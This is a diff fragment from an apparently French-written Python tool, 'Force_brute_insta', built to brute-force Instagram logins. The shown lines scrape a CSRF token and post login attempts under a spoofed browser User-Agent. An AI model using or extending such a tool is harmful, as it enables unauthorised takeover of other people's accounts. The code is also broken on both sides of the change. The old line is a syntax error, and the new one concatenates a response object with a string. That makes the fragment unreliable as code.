@@ -222,7 +222,7 @@ class Force_brute_insta(object):
         }
         with requests.Session() as sauve:
             _requete = sauve.get(_lien_connexion)
-            _csrf_jeton = re.findall(requete"csrf_token\":\"(.*?)\"", _requete.text)[0]
+            _csrf_jeton = re.findall(_requete+"csrf_token\":\"(.*?)\"", _requete.text)[0]
             _reqs = sauve.post(_url_connexion, data=_charge_utile, headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
